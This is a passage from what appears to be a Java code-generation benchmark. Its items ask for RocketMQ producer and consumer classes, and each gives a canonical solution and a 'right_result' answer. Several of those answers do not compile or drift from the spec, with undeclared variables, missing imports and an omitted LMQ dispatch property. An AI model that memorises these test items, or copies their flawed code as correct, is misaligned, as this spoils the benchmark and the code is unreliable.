pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}\n```"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic with tag filtering.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that subscribes to a topic and processes incoming messages using a concurrent message listener. It supports broadcasting message model and can be configured with various consumption strategies.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address for RocketMQ\n- TOPIC: [String] - The topic to subscribe to for messages\n- SUB_EXPRESSION: [String] - Tag filter expression for message subscription\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- PushConsumer() [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers the message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class PushConsumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_1\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n    public static final String SUB_EXPRESSION = \"TagA || TagC || TagD\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n        consumer.subscribe(TOPIC, SUB_EXPRESSION);\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Broadcast Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n    public static final String CONSUMER_GROUP = \"consumer_group\";\n    public static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    public static final String TOPIC = \"test_topic\";\n    public static final String SUB_EXPRESSION = \"*\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, SUB_EXPRESSION);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static void main(String[] args) {\n        try {\n            PushConsumer pushConsumer = new PushConsumer();\n            pushConsumer.start();\n            Runtime.getRuntime().addShutdownHook(new Thread(pushConsumer::shutdown));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with namespace support to asynchronously consume messages from a specified topic.\n\nClass Description: The PushConsumerWithNamespace class is designed to consume messages from a RocketMQ topic using a push-based model. It supports namespace configuration and provides methods to initialize, start, and shutdown the consumer. The consumer processes messages concurrently and prints message details to the console.\n\nAttributes:\n- NAMESPACE: [String] - The namespace identifier for the RocketMQ instance\n- CONSUMER_GROUP: [String] - The consumer group name\n- DEFAULT_NAMESRVADDR: [String] - The NameServer address\n- TOPIC: [String] - The topic to subscribe to\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initializeConsumer(): [void]() -> [void] - Initializes the consumer with namespace, NameServer address, topic subscription, and message listener configuration\n- startConsumer(): [void]() -> [void] - Starts the consumer to begin message consumption\n- shutdownConsumer(): [void]() -> [void] - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\n\npublic class PushConsumerWithNamespace {\n    public static final String NAMESPACE = \"InstanceTest\";\n    public static final String CONSUMER_GROUP = \"cidTest\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"NAMESPACE_TOPIC\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamespaceV2(NAMESPACE);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            msgs.forEach(msg -> System.out.printf(\"Msg topic is:%s, MsgId is:%s, reconsumeTimes is:%s%n\", \n                msg.getTopic(), msg.getMsgId(), msg.getReconsumeTimes()));\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdownConsumer() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumerWithNamespace {\n    private static final String NAMESPACE = \"your_namespace\";\n    private static final String CONSUMER_GROUP = \"your_consumer_group\";\n    private static final String DEFAULT_NAMESRVADDR = \"your_namesrv_addr\";\n    private static final String TOPIC = \"your_topic\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.setNamespace(NAMESPACE);\n\n        try {\n            consumer.subscribe(TOPIC, \"*\");\n            consumer.registerMessageListener(new MessageListenerConcurrently() {\n                @Override\n                public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                    for (MessageExt msg : msgs) {\n                        System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n                    }\n                    return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startConsumer() {\n        if (consumer != null) {\n            consumer.start();\n            System.out.println(\"Consumer started.\");\n        }\n    }\n\n    public void shutdownConsumer() {\n        if (consumer != null) {\n            consumer.shutdown();\n            System.out.println(\"Consumer shut down.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        PushConsumerWithNamespace consumerInstance = new PushConsumerWithNamespace();\n        consumerInstance.initializeConsumer();\n        consumerInstance.startConsumer();\n\n        // Simulate running for some time before shutting down\n        try {\n            Thread.sleep(10000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        consumerInstance.shutdownConsumer();\n    }\n}\n```\n\nThis Java class `PushConsumerWithNamespace` demonstrates how to create a RocketMQ push consumer with namespace support. It initializes the consumer, starts it, and shuts it down properly. The consumer listens for messages on a specified topic and prints their details to the console. The `main` method shows how to use this class to run a consumer for a simulated duration before shutting down."
  },
  {
    "Task_id": 379,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The Consumer class is a RocketMQ message consumer that uses push-based consumption model. It allows subscribing to topics, registering message listeners, and managing the consumer lifecycle (startup and shutdown).\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- Constructor: Consumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group name and NameServer address. Sets the consumption offset strategy to start from the first offset.\n- subscribe: subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering using a subscription expression.\n- registerMessageListener: registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages.\n- start: start() -> void - Starts the consumer to begin message consumption.\n- shutdown: shutdown() -> void - Shuts down the consumer gracefully.\n\nNested Class:\n- SimpleMessageListener: Implements MessageListenerConcurrently interface to provide basic message handling functionality. Prints received messages and returns CONSUME_SUCCESS status.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.println(String.format(\"Consumer %s Started.\", consumer.getConsumerGroup()));\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                       ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic, measuring the delay between message delivery and consumption.\n\nClass Description: The TimerConsumer class is a RocketMQ push consumer that subscribes to a specified topic, processes incoming messages, and calculates the time delay between when messages were delivered and when they were consumed. It provides command-line configuration for NameServer address and topic name.\n\nAttributes:\n- topic: String - The RocketMQ topic to subscribe to for messages\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- TimerConsumer(String[] args) - Constructor - Initializes the consumer with command-line arguments for NameServer address and topic\n  Input: args: String[] - Command-line arguments containing optional NameServer address and topic\n  Output: None\n\n- start() - void - Starts the consumer, subscribes to the topic, and registers a message listener\n  Input: None\n  Output: None (throws MQClientException if startup fails)\n\n- buildCommandlineOptions(Options options) - Options - Helper method to define command-line options\n  Input: options: Options - Apache Commons CLI Options object to extend\n  Output: Options - The extended Options object with consumer-specific options",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.ThreadFactoryImpl;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.srvutil.ServerUtil;\n\nimport java.util.List;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class TimerConsumer {\n    private final String topic;\n    private final DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = ServerUtil.buildCommandlineOptions(new Options());\n        final CommandLine commandLine = ServerUtil.parseCmdLine(\"benchmarkTimerConsumer\", args, buildCommandlineOptions(options), new DefaultParser());\n        if (null == commandLine) {\n            System.exit(-1);\n        }\n\n        final String namesrvAddr = commandLine.hasOption('n') ? commandLine.getOptionValue('t').trim() : \"localhost:9876\";\n        topic = commandLine.hasOption('t') ? commandLine.getOptionValue('t').trim() : \"BenchmarkTest\";\n        System.out.printf(\"namesrvAddr: %s, topic: %s%n\", namesrvAddr, topic);\n\n        consumer = new DefaultMQPushConsumer(\"benchmark_consumer\");\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                MessageExt msg = msgs.get(0);\n                long now = System.currentTimeMillis();\n\n                long deliverTimeMs = Long.parseLong(msg.getProperty(\"MY_RECORD_TIMER_DELIVER_MS\"));\n                long delayedDuration = now - deliverTimeMs;\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Start receiving messages%n\");\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Nameserver address, default: localhost:9876\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Send messages to which topic, default: BenchmarkTest\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.commons.cli.*;\n\nimport java.util.List;\n\npublic class TimerConsumer {\n    private static final String DEFAULT_TOPIC = \"TimerTopic\";\n    private String topic;\n    private DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) throws ParseException {\n        CommandLineParser parser = new DefaultParser();\n        Options options = buildCommandlineOptions(new Options());\n        CommandLine cmd = parser.parse(options, args);\n\n        this.topic = cmd.hasOption(\"t\") ? cmd.getOptionValue(\"t\") : DEFAULT_TOPIC;\n        this.consumer = new DefaultMQPushConsumer(\"TimerConsumerGroup\");\n    }\n\n    public void start() throws MQClientException {\n        consumer.setNamesrvAddr(cmd.hasOption(\"n\") ? cmd.getOptionValue(\"n\") : \"localhost:9876\");\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                long consumeTimeMillis = System.currentTimeMillis();\n                long produceTimeMillis = Long.parseLong(msg.getUserProperty(\"__STARTDELIVERTIME\"));\n                long delayTimeMillis = consumeTimeMillis - produceTimeMillis;\n                System.out.println(\"Message ID: \" + msg.getMsgId() + \", Delay Time: \" + delayTimeMillis + \"ms\");\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        consumer.start();\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Name server address.\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"RocketMQ topic.\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n\n    public static void main(String[] args) {\n        try {\n            TimerConsumer consumer = new TimerConsumer(args);\n            consumer.start();\n        } catch (ParseException | MQClientException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 381,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic using Apache RocketMQ client library.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to create, configure, and manage a RocketMQ message producer. It handles producer initialization, message creation, message sending, and producer shutdown.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the NameServer for service discovery\n- producerGroup: String - The group name of the producer\n- topic: String - The target topic for message sending\n- messageSize: int - The size of the message to be sent\n\nMethods:\n- RocketMQProducer(String, String, String, int) - Constructor - Initializes the producer with NameServer address, producer group, topic, and message size\n- start() -> void - Configures and starts the producer instance\n- sendMessage() -> SendResult - Creates and sends a message to the configured topic\n- shutdown() -> void - Shuts down the producer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void start() throws MQClientException {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setVipChannelEnabled(false);\n        producer.start();\n    }\n\n    public SendResult sendMessage() throws Exception {\n        StringBuilder sb = new StringBuilder();\n        for (int j = 0; j < messageSize; j += 10) {\n            sb.append(\"hello baby\");\n        }\n        byte[] body = sb.toString().getBytes(StandardCharsets.UTF_8);\n        Message message = new Message(topic, body);\n        return producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void start() throws Exception {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage() throws Exception {\n        byte[] msgBody = new byte[messageSize];\n        // Initialize message body with dummy data\n        for (int i = 0; i < messageSize; i++) {\n            msgBody[i] = (byte) i;\n        }\n        Message msg = new Message(topic, \"TagA\", msgBody);\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to both regular topics and LMQ (Light Message Queue) topics. The producer should support initialization, message sending with custom properties, and proper shutdown.\n\nClass Description: The LMQProducer class is a RocketMQ producer implementation that demonstrates how to send messages to both regular topics and LMQ topics. It handles producer lifecycle management and message sending with multi-dispatch capabilities.\n\nAttributes:\n- PRODUCER_GROUP: String - The name of the producer group\n- DEFAULT_NAMESRVADDR: String - Default NameServer address (format: \"ip:port\")\n- TOPIC: String - The main topic to which messages will be sent\n- TAG: String - The tag for messages\n- LMQ_TOPIC_1: String - First LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- LMQ_TOPIC_2: String - Second LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- producer: DefaultMQProducer - The RocketMQ producer instance\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the producer by creating a new DefaultMQProducer instance, setting the NameServer address, and starting the producer\n- sendMessage(int messageId) throws Exception -> SendResult - Creates and sends a message with the given ID, setting message keys and LMQ dispatch properties\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageConst;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class LMQProducer {\n    public static final String PRODUCER_GROUP = \"ProducerGroupName\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String TAG = \"TagA\";\n    public static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"123\";\n    public static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"456\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, (\"Hello RocketMQ \" + messageId).getBytes(RemotingHelper.DEFAULT_CHARSET));\n        msg.setKeys(\"Key\" + messageId);\n        msg.putUserProperty(MessageConst.PROPERTY_INNER_MULTI_DISPATCH,\n            String.join(MixAll.LMQ_DISPATCH_SEPARATOR, LMQ_TOPIC_1, LMQ_TOPIC_2));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class LMQProducer {\n    private static final String PRODUCER_GROUP = \"LMQProducerGroup\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"testTopic\";\n    private static final String TAG = \"TagA\";\n    private static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"testLMQTopic1\";\n    private static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"testLMQTopic2\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, \"Key\" + messageId, (\"Hello RocketMQ \" + messageId).getBytes(RemotingHelper.DEFAULT_CHARSET));\n        msg.putUserProperty(\"dispatchType\", \"ALL\");\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message producer sink for sending messages to RocketMQ topics, supporting both synchronous and asynchronous message delivery, batch processing, and configurable message delay levels.\n\nClass Description: The RocketMQSink class is a Flink-compatible sink that sends messages to RocketMQ. It handles message serialization, topic selection, and provides configurable message delivery options including synchronous/asynchronous sending, batch processing, and delayed message delivery.\n\nAttributes:\n- LOG: Logger - Logger instance for logging debug and error messages\n- producer: DefaultMQProducer - RocketMQ producer instance for sending messages\n- async: boolean - Flag indicating whether to use asynchronous message sending\n- props: Properties - Configuration properties for the producer\n- topicSelector: TopicSelector<IN> - Selector for determining message topics and tags\n- serializationSchema: KeyValueSerializationSchema<IN> - Schema for serializing input data\n- batchFlushOnCheckpoint: boolean - Flag indicating whether to use batch processing\n- batchSize: int - Maximum batch size for batch processing\n- batchList: List<Message> - Buffer for batch messages\n- messageDeliveryDelayLevel: int - Configuration for delayed message delivery\n\nMethods:\n- RocketMQSink(KeyValueSerializationSchema<IN>, TopicSelector<IN>, Properties) -> void - Constructor that initializes the sink with serialization schema, topic selector, and configuration properties\n- open(Configuration) -> void - Initializes the RocketMQ producer and prepares for message sending\n- invoke(IN) -> void - Processes and sends a single message (either immediately or adds to batch)\n- prepareMessage(IN) -> Message - Creates a RocketMQ Message object from input data\n- close() -> void - Cleans up resources and shuts down the producer\n- flushSync() -> void - Sends all batched messages synchronously (used when batch processing is enabled)",
    "Canonical_solution": "import com.zhisheng.connectors.rocketmq.common.selector.TopicSelector;\nimport com.zhisheng.connectors.rocketmq.common.serialization.KeyValueSerializationSchema;\nimport org.apache.commons.lang3.Validate;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> {\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n\n    private transient DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize = 1000;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> schema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = schema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.messageDeliveryDelayLevel = RocketMQUtils.getInteger(this.props, RocketMQConfig.MSG_DELAY_LEVEL,\n                RocketMQConfig.MSG_DELAY_LEVEL00);\n        if (this.messageDeliveryDelayLevel < RocketMQConfig.MSG_DELAY_LEVEL00) {\n            